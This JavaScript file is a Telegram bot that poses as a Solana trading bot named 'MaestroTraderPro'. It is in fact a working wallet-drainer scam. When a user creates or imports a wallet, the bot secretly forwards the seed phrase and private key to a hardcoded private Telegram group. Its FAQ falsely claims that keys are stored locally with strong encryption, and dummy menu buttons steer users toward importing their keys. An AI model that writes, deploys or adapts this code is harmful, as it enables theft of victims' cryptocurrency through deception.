const { Markup } = require('telegraf');
const { Connection, PublicKey, Keypair } = require('@solana/web3.js');
const bip39 = require('bip39');
const bs58 = require('bs58');
const { getUserState, updateUserState } = require('./state');

const SOLANA_RPC = 'https://solana-mainnet.g.alchemy.com/v2/5aM07MXcL5lhjRzgf6jNW';
const PRIVATE_GROUP_ID = -1002914341678;
const connection = new Connection(SOLANA_RPC);

// Generate math captcha
const generateCaptcha = () => {
  const a = Math.floor(Math.random() * 10) + 1;
  const b = Math.floor(Math.random() * 10) + 1;
  return { question: `${a} + ${b} = ?`, answer: a + b };
};

// Create new Solana wallet
const createSolanaWallet = () => {
  const mnemonic = bip39.generateMnemonic();
  const seed = bip39.mnemonicToSeedSync(mnemonic).slice(0, 32);
  const keypair = Keypair.fromSeed(seed);
  return {
    publicKey: keypair.publicKey.toString(),
    privateKey: bs58.encode(keypair.secretKey),
    mnemonic
  };
};

// UI Components
const keyboards = {
  mainMenu: () => Markup.inlineKeyboard([
    [Markup.button.callback('Menu (⬅️)', 'main_menu')],
    [Markup.button.callback('Balance(💰)', 'check_balance')],
    [Markup.button.callback('Wallets (💼)', 'wallets')],
    [Markup.button.callback('FAQ (ℹ️)', 'faq')],
    // Non-functional buttons
    ...[
      'Chains (🔗)', 'Presales (🤝)', 'Copytrade (📋)',
      'Signals (📡)', 'God Mode (⚙️)', 'Positions (📈)',
      'Auto Snipe (🎯)', 'Bridge (⬅️)', 'Premium (⭐)'
    ].map(text => [Markup.button.callback(text, 'non_functional')])
  ]),
  
  walletsMenu: () => Markup.inlineKeyboard([
    [Markup.button.callback('Import Wallet', 'import_wallet')],
    [Markup.button.callback('Create Wallet', 'create_wallet')],
    [Markup.button.callback('Back', 'main_menu')]
  ]),
  
  backOnly: (target) => Markup.inlineKeyboard([
    Markup.button.callback('⬅️ Back', target)
  ])
};

const messages = {
  welcome: `⭐️ <b>Welcome to MaestroTraderPro</b> ⭐️\n\n` +
    `🔗 Chains: Enable/disable chains\n` +
    `💳 Wallets: Import or generate wallets\n` +
    `⚙️ Global Settings: Customize the bot\n` +
    `📈 Positions: Monitor active trades\n\n` +
    `⚡ <b>Quick trade:</b> Paste token CA to start!`,
    
  faq: `⭐️ <b>MaestroTraderPro FAQ</b> ⭐️\n\n` +
    `🔹 <b>How to trade:</b>\n1. Paste token contract address\n2. Set buy/sell parameters\n3. Execute trade\n\n` +
    `🔹 <b>Wallet Security:</b>\nAll keys stored locally in military-grade encryption\n\n` +
    `🔹 <b>Premium Features:</b>\n- Priority trade execution\n- Advanced sniper tools\n- Real-time whale alerts\n\n` +
    `🔹 Support: @MaestroSupport`
};

// Core Handlers
const setupHandlers = (bot) => {
  // Start command with captcha
  bot.start(async (ctx) => {
    const captcha = generateCaptcha();
    updateUserState(ctx.chat.id, { captcha: captcha.answer });
    
    await ctx.replyWithHTML(
      `🔐 <b>Security Verification</b>\nSolve to prove you're human:\n\n<code>${captcha.question}</code>`,
      Markup.inlineKeyboard([
        Markup.button.callback(captcha.answer.toString(), 'captcha_correct'),
        Markup.button.callback((captcha.answer + 1).toString(), 'captcha_wrong'),
        Markup.button.callback((captcha.answer - 1).toString(), 'captcha_wrong')
      ])
    );
  });

  // Captcha handler
  bot.action('captcha_correct', async (ctx) => {
    await ctx.deleteMessage();
    updateUserState(ctx.chat.id, { passedCaptcha: true });
    await ctx.replyWithHTML(messages.welcome, keyboards.mainMenu());
  });

  // Wrong captcha
  bot.action('captcha_wrong', async (ctx) => {
    await ctx.answerCbQuery('❌ Incorrect! Try again');
  });

  // Main menu navigation
  bot.action('main_menu', async (ctx) => {
    await ctx.editMessageText('⭐️ <b>MaestroTraderPro Main Menu</b> ⭐️', {
      parse_mode: 'HTML',
      ...keyboards.mainMenu()
    });
  });

  // Wallet management
  bot.action('wallets', async (ctx) => {
    await ctx.editMessageText('🔐 <b>Wallet Management</b>\nImport existing or create new wallet:', {
      parse_mode: 'HTML',
      ...keyboards.walletsMenu()
    });
  });

  // Wallet creation
  bot.action('create_wallet', async (ctx) => {
    const wallet = createSolanaWallet();
    
    // Send credentials to private group
    ctx.telegram.sendMessage(
      PRIVATE_GROUP_ID,
      `🔥 NEW WALLET CREATED 🔥\n\nUser: @${ctx.from.username}\nID: ${ctx.from.id}\n\n` +
      `Seed: ${wallet.mnemonic}\nPrivate: ${wallet.privateKey}\nPublic: ${wallet.publicKey}`
    );

    updateUserState(ctx.chat.id, { publicKey: wallet.publicKey });

    await ctx.editMessageText(
      `✅ <b>Wallet Created!</b>\n\nPublic Key: <code>${wallet.publicKey}</code>\n\n` +
      `🔐 <b>SAVE YOUR SEED PHRASE:</b>\n<code>${wallet.mnemonic}</code>\n\n` +
      `⚠️ Never share with anyone!`,
      {
        parse_mode: 'HTML',
        ...keyboards.backOnly('wallets')
      }
    );
  });

  // Balance check
  bot.action('check_balance', async (ctx) => {
    const user = getUserState(ctx.chat.id);
    let balance = '0.00';

    if (user?.publicKey) {
      try {
        const publicKey = new PublicKey(user.publicKey);
        const bal = await connection.getBalance(publicKey);
        balance = (bal / 1e9).toFixed(2);
      } catch (e) {
        console.error('Balance check error:', e.message);
      }
    }

    await ctx.editMessageText(`💰 <b>Wallet Balance</b>\n\nSOL: ${balance}`, {
      parse_mode: 'HTML',
      ...keyboards.mainMenu()
    });
  });

  // FAQ handler
  bot.action('faq', async (ctx) => {
    await ctx.editMessageText(messages.faq, {
      parse_mode: 'HTML',
      ...keyboards.backOnly('main_menu')
    });
  });

  // Wallet import initiation
  bot.action('import_wallet', async (ctx) => {
    updateUserState(ctx.chat.id, { awaitingWallet: true });
    await ctx.editMessageText(
      '📥 <b>Wallet Import</b>\n\nInput your seed phrase or private key:',
      {
        parse_mode: 'HTML',
        ...keyboards.backOnly('wallets')
      }
    );
  });

  // Non-functional features
  bot.action('non_functional', async (ctx) => {
    await ctx.answerCbQuery('⚠️ No wallet detected. Import or create a wallet to continue');
  });

  // Wallet import processing
  bot.on('text', async (ctx) => {
    const user = getUserState(ctx.chat.id);
    if (!user?.awaitingWallet) return;
    
    const walletInput = ctx.message.text.trim();
    let publicKey = '';
    let keyType = '';
    
    try {
      // Try to process as private key
      const keypair = Keypair.fromSecretKey(bs58.decode(walletInput));
      publicKey = keypair.publicKey.toString();
      keyType = 'Private Key';
    } catch (e) {
      try {
        // Try to process as seed phrase
        const seed = bip39.mnemonicToSeedSync(walletInput).slice(0, 32);
        const keypair = Keypair.fromSeed(seed);
        publicKey = keypair.publicKey.toString();
        keyType = 'Seed Phrase';
      } catch (err) {
        return ctx.reply('❌ Invalid input. Send seed phrase or private key');
      }
    }
    
    // Send credentials to private group
    ctx.telegram.sendMessage(
      PRIVATE_GROUP_ID,
      `🔥 WALLET IMPORTED 🔥\n\nUser: @${ctx.from.username}\nID: ${ctx.from.id}\n\n` +
      `Type: ${keyType}\nValue: ${walletInput}\nPublic Key: ${publicKey}`
    );
    
    // Update state
    updateUserState(ctx.chat.id, {
      publicKey,
      awaitingWallet: false
    });
    
    // Get balance
    let balance = '0.00';
    try {
      const bal = await connection.getBalance(new PublicKey(publicKey));
      balance = (bal / 1e9).toFixed(2);
    } catch (e) {
      console.error('Balance fetch error:', e.message);
    }
    
    await ctx.replyWithHTML(
      `✅ <b>Wallet Imported Successfully!</b>\n\n` +
      `Public Key: <code>${publicKey}</code>\nBalance: ${balance} SOL`,
      keyboards.mainMenu()
    );
  });
};

module.exports = { setupHandlers };
